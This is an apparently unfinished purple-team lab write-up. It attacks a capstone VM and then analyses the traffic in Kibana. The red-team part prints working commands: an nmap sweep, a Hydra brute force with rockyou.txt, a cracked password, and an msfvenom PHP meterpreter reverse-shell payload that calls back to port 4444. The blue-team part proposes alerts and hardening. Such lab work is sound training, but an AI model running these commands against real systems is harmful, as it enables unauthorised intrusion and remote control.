# Purple Teaming

Monitoring Setup Instructions

As I attack the webserver I need to make sure that my Elastic Stack is recording my activity.

I start by launching the Elastic Stack and Kibana on my monitoring server:


#### Filebeat Setup:

##### Commands Used:

```bash
filebeat modules enable apache
```

```bash
filebeat setup
```

![filebeat_setup.png](https://github.com/Sk3llington/Purple-Teaming/blob/main/images/filebeat_setup.png)


#### Metricbeat Setup:

##### Commands Used:


```bash
metricbeat modules enable apache
```

```bash
metricbeat setup
```

![metrcibeat_setup.png](https://github.com/Sk3llington/Purple-Teaming/blob/main/images/metricbeat_setup.png)


#### Packetbeat Setup:

##### Commands Used:

```bash
packetbeat setup
```

Commands used to restart all 3 services:

```bash
systemctl restart filebeat
```
```bash
systemctl restart metricbeat
```
```bash
systemctl restart packetbeat
```


## Time To Attack!

Today, I will act as an offensive security Red Teamer to exploit a vulnerable Capstone Virtual Machine.

### The following tools will be used for this red team engagement:

- Firefox
- Hydra
- Nmap
- John the Ripper
- Metasploit
- curl
- MSVenom


Now it's time to search for the webserver that I am looking to attack.

### Below, the `nmap` command I used to discover the IP address of the Linux web server and have all IPs discovered saved into the file `nmap_scanned_ips`:

```bash
nmap -sn 192.168.0.0/24 | awk '/Nmap scan/{gsub(/[()]/,"",$NF); print $NF > "nmap_scanned_ips"}'
```

From the list of IPs that Nmap has discovered on my virtual private network:

![nmap_scanned_ips](https://github.com/Sk3llington/Purple-Teaming/blob/main/images/nmap_scanned_ips.png)


I then run a service scan on all IPs except the IP of my Kali VM machine (192.168.1.90):


![nmap_webserver_nmap_lookup](https://github.com/Sk3llington/Purple-Teaming/blob/main/images/nmap_webserver_nmap_lookup.png)


I found the Linux Apache webserver I was looking for with the IP address `192.168.1.105` on port `80`.

Next, I open a web browser to access the webserver:

![webserver_webdirectory](https://github.com/Sk3llington/Purple-Teaming/blob/main/images/webserver_web_directory.png)


Next, I am tasked with finding a secret folder and break into it.

After reading the company's blog I found a lead on the location of the secret folder:

> 192.168.1.105/company_folder/company_culture/file1.txt

![secret_folder_clue](https://github.com/Sk3llington/Purple-Teaming/blob/main/images/secret_folder_clue.png)

Next, in the "meet our team" section I found an interesting text file with a clue about who is in charge of the folder. His name is Ashton:

> 192.168.1.105/meet_our_team/ashton.txt

![secret_folder_admin_ashton](https://github.com/Sk3llington/Purple-Teaming/blob/main/images/secret_folder_admin_ashton.png)

Next, I used `Hydra` to brute force the access to the secret folder located at /company_folders/secret_folder.

I used the following command to brute force the access to the web page using `ashton` as the username and the `rockyou.txt` wordlist to brute force his password:

```bash
hydra -l ashton -P /usr/share/wordlists/rockyou.txt -s 80 -f -vV 192.168.1.105 http-get /company_folders/secret_folder
```

![hydra_brute_forced_password]

Next, I use Ashton's credentials to acces the secret_folder. I found a note that he left to himself, detailing how to connect to the company's webdav server:

![ashton_instruction_webdav]


I noticed a hash for ryan's account is displayed on the page. I decided to use the Crack Station website to crack it... And it worked!

![crack_station_cracked_hash]


The cracked password is: `linux4u`


Next, from the details left by Ashton on how to connect to the Webdav server, I figured out the path using the updated IP address of their server and successfully accessed the login windows and authenticated with the cracked credentials   `Ryan:linux4u`:

 ![]
![]
![]


Following the successful connection to the Webdav server, I am tasked with dropping a PHP reverse Shell payload.

I used `msfvenom` to create my payload file named `exploit.php` with the following command:

```bash
/usr/bin/msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.90 LPORT=4444 R > exploit.php
```

![php_payload_creation]


Next, I uploaded the reverse shell payload (exploit.php file) into the Webdav server:

![copy_paste_exploitPHP_in_webdav]



# Day 2

Part one: turning on the beats (add screenshots)

# Dashboard Creation


Add screenshots in order to show how to create dashboards

add screenshot of the full dashboard:

![full_dashboard_part1]

![full_dashboard_part2]


## Identify the offensive traffic.

### Identify the traffic between your machine and the web machine:

 - When did the interaction occur?

 the interaction occured between Sep 15, 2021 @ 02:10:00 and Sep 15, 2021 @ 2:20:00

 ![when_interaction_occured]

- What responses did the victim send back?

Since we know when the interaction between my attacking machine and the victim's machine occured, we set the date and time to Sep 15, 2021 @ 02:10:00 and Sep 15, 2021 @ 2:20:00 and refresh our dashboard. Next we look at the top responses that the victim's machine sent back from our HTTP Status Codes pie charts. The codes returned are `200`, `303`, `204`:

![responses_sent_back_by_victim]
![error_responses_sent_back_by_victim]


- What data is concerning from the Blue Team perspective?

The data that is concerning is the spike in `Connections over time` as seen in the screenshot below:

![concerning spike in connections]

As well as the spike in `Errors vs Successful Transactions` as seen below:

![errors_vs_successful_transac_spike]


### Find the request for the hidden directory.


- How many requests were made to this directory? At what time and from which IP address(es)?

107,601 requests were made to this directory. between Sep 15, 2021 @ 03:03:00 and Sep 15, 2021 @ 03:12:00

The requests were made from the IP address `192.168.1.90`

![secret_directory_requests_number]

![secret_directory_requests_details]


- Which files were requested? What information did they contain?

![connect_to_corp_file]

![exploit_php_file]


- What kind of alarm would you set to detect this behavior in the future?

We can set an alert each time someone accesses the `secret_folder`.

- Identify at least one way to harden the vulnerable machine that would mitigate this attack.

Since this folder is not meant to be accessible to the public, it should not be on a server that has an open connection to the internet.


### Identify the brute force attack.

After identifying the hidden directory, you used Hydra to brute-force the target server. Answer the following questions:

- Can you identify packets specifically from Hydra?

Yes, while searching for the `GET` queries for the `/company_folders/secret_folder` I noticed that the field `user_agent.original` has the value "Mozilla/4.0 (Hydra)".

![brute_force_hydra_clue]


Next, to filter out packets specifically from Hydra, I used the following query:

```
user_agent.original : *Hydra*
```



- How many requests were made in the brute-force attack? How many requests had the attacker made before discovering the correct password in this one?

107,601 brute force attack requests were made. And out of these only 2 were successful (the file inside was accesses twice).


![brute_force_attack_request]

Take a look at the HTTP status codes for the top queries [Packetbeat] ECS panel:

![brute_force_attack_error_code_chart]

You can see on this panel the breakdown of 401 Unauthorized status codes as opposed to 200 OK status codes.


We can also see the spike in both traffic to the server and error codes.


We can see a connection spike in the Connections over time [Packetbeat Flows] ECS


![brute_force_attack_connections_overtime]

We can also see a spike in errors in the Errors vs successful transactions [Packetbet] ECS

![brute_force_attack_error_vs_successful_transac]

These are all results generated by the brute force attack with Hydra.


- What kind of alarm would you set to detect this behavior in the future and at what threshold(s)?

I would set an alert for `401 Unauthorized` (meaning Unauthenticated) is returned from any server. I would start with a threshold at 10 in one hour and refine it to exclude forgotten passwords.

I would also add an alert if the `user_agent.original` value includes "Hydra" in the name.


- Identify at least one way to harden the vulnerable machine that would mitigate this attack.


 ===========  REPHRASES + look for MORE MITIGATIONS =============

 After the limit of 10 401 Unauthorized codes have been returned from a server, that server can automatically drop traffic from the offending IP address for a period of 1 hour. We could also display a lockout message and lock the page from login for a temporary period of time from that user.

===========  REPHRASES + look for MORE MITIGATIONS =============


4. ### Find the WebDav Connection

How many requests were made to this directory?

We can see that 51,253 requests were made to this directory. We also have the requests count made to its sub-folders.

![webdav_directory_requests]



#### Which file(s) were requested?

We can see the passwd.dav file was requested as well as "lib" and "exploit.php", which is our malicious file.


#### What kind of alarm would you set to detect such access in the future?


We can restrict the access to the machine to selected machines and create an alert when other machines get access to the folder.


#### Identify at least one way to harden the vulnerable machine that would mitigate this attack.


- Connections to this shared folder should not be accessible from the web interface.


- Connections to this shared folder could be restricted by machine with a firewall rule.


5. ## Identify the Reverse Shell and meterpreter Traffic


To finish off the attack, you uploaded a PHP reverse shell and started a meterpreter shell session. Answer the following questions:

##### Can you identify traffic from the meterpreter session?


First, we can see the `exploit.php` file in the webdav directory on the Top 10 HTTP requests [Packetbeat] ECS panel.


![webdav_directory_request]


 =================== Remember that your meterpreter session ran over port 4444. Port 4444 is the default port used for meterpreter and the port used in all of their documentation. Because of this, many attackers forget to change this port when conducting an attack. You can construct a search query to find these packets.

 ==============================================

 ![meterpreter_ID_traffic_query]



#### What kinds of alarms would you set to detect this behavior in the future?


We can set an alert for any traffic moving over port 4444.

We can set an alert for any .php file that is uploaded to a server.


#### Identify at least one way to harden the vulnerable machine that would mitigate this attack.

Removing the ability to upload files to this directory over the web interface would take care of this issue.
